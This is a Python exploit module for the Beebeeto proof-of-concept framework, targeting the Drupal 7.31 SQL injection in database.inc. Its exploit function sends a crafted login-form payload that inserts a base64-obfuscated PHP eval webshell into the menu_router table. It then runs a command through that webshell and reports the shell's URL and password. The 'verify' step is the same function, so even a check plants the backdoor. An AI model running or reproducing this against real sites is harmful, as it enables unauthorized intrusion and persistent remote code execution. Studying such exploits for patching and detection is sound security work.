#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

# 漏洞分析：https://www.ricter.me/posts/Drupal%20%E7%9A%84%20callback%20%E5%99%A9%E6%A2%A6

import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0100',
            'name': 'Drupal 7.31 GetShell via /includes/database/database.inc SQL Injection Exploit',
            'author': 'Ricter',
            'create_date': '2014-10-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Drupal',
            'vul_version': ['<=7.31'],
            'type': 'Code Execution',
            'tag': ['Drupal漏洞', '代码执行漏洞', 'SQL注入漏洞', 'PHP', 'GETSHELL'],
            'desc': '''
                    Drupal 7.31 /includes/database/database.inc在处理IN语句时，展开数组时key带入SQL语句导致SQL注入，
                    可以添加管理员、造成信息泄露，利用特性也可 getshell。
                    ''',
            'references': ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html'],
        },
    }

    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        webshell_url = url + '/?q=<?php%20eval(base64_decode(ZXZhbCgkX1BPU1RbZV0pOw));?>'
        payload = "name[0;insert into menu_router (path,  page_callback, access_callback, " \
                  "include_file, load_functions, to_arg_functions, description) values ('<" \
                  "?php eval(base64_decode(ZXZhbCgkX1BPU1RbZV0pOw));?>','php_eval', '1', '" \
                  "modules/php/php.module', '', '', '');#]=test&name[0]=test2&pass=test&fo" \
                  "rm_id=user_login_block"

        if args['options']['verbose']:
            print '[*] Request URL: ' + url
            print '[*] POST Content: ' + payload

        urllib2.urlopen(url, data=payload)
        request = urllib2.Request(webshell_url, data="e=echo strrev(gwesdvjvncqwdijqiwdqwduhq);")
        response = urllib2.urlopen(request).read()

        if 'gwesdvjvncqwdijqiwdqwduhq'[::-1] in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = url
            args['poc_ret']['Webshell'] = webshell_url
            args['poc_ret']['Webshell_PWD'] = 'e'
            return args
        args['success'] = False
        return args

    verify = exploit

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())